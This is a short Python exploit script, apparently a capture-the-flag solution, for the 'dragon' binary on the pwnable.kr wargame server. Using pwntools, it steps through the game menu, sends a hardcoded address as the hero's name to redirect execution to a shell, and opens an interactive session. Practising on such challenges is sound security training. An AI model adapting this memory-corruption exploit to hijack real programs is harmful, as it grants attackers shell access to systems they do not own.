from pwn import *

context.log_level = "debug"
shell_addr = 0x8048dbf

r = remote("pwnable.kr", 9004)
# r = process("./dragon")

r.recvuntil(b"Choose Your Hero\n[ 1 ] Priest\n[ 2 ] Knight\n")
r.sendline(b"2")
r.sendline(b"2")
r.recvuntil(b"Choose Your Hero\n[ 1 ] Priest\n[ 2 ] Knight\n")
r.sendline(b"1")
for _ in range(4):
    r.sendline(b"3")
    r.sendline(b"3")
    r.sendline(b"2")
r.recvuntil("The World Will Remember You As:\n")
r.sendline(p32(shell_addr))
r.interactive()
